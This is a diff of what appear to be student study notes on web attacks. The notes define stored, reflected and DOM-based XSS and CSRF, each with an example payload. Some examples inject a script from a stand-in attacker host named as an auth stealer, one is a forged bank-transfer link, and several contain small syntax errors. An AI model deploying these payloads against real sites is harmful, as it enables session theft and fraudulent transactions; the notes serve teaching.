@@ -98,19 +98,20 @@ what is nop-sled and how it is used
 - Task1: Define terms and give example:
   - Stored XSS:
     - A persistent XSS, more damage than reflected, the malicious script is injected directly into vulnerable web app, and the script is execute when ever user visit website
-    - Directly inject script to html file: script src=”http://hackersite.com/authstealer.js”> </script>.
+    - Directly inject script to html file: `<script> src=”http://hackersite.com/authstealer.js”> </script>.`
   - Reflected XSS:
     - a non-persistent attacks, attacker embedded  malicious script, when user click on the link it will executed 
-    - E.g: Inject java script to html tag like: <a url=http://forum.com?q=news<\script%20src=”http://hackersite.com/authstealer.js”/>
+    - E.g: Inject java script to html tag like: `<a url=http://forum.com?q=news<\script%20src=”http://hackersite.com/authstealer.js”/>`
   - DOM-based XSS:
     - Client side attack, the attack will send the page content instead of server with the html file is injected with malicious code 
     - E.g: attacker can inject an addition box in to these form 
+		<img src="https://1.bp.blogspot.com/-8Dn99Siwl-U/VA5r4Csc4sI/AAAAAAAADNQ/0yQHSR3ayFI/s1600/dombased-xss-1.png">
 		
-		By change message=Please fill in the form to message=<label>Gender</label><div class="col-sm-4"><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select></div><script>function show(){alert();}</script>
-
+		By change message=Please fill in the form to `message=<label>Gender</label><div class="col-sm-4"><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select></div><script>function show(){alert();}</script>`
+		<img src="https://1.bp.blogspot.com/-AbZldTkY3Hs/VA5r4AQ7xrI/AAAAAAAADNM/PfO4f5HafSg/s1600/dombased-xss-3.png">
   - CSRF:
     - Using authenticated session cookie of user to establish unwanted operation forge the normal user
-    - E.g: a attacker's website implement <a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a> to take advantage of if the user already login to bank.com and the cookie still store the authentication token
+    - E.g: a attacker's website implement `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>` to take advantage of if the user already login to bank.com and the cookie still store the authentication token
 - Task 2: define term:
   - Evolutionary algorithm:
   
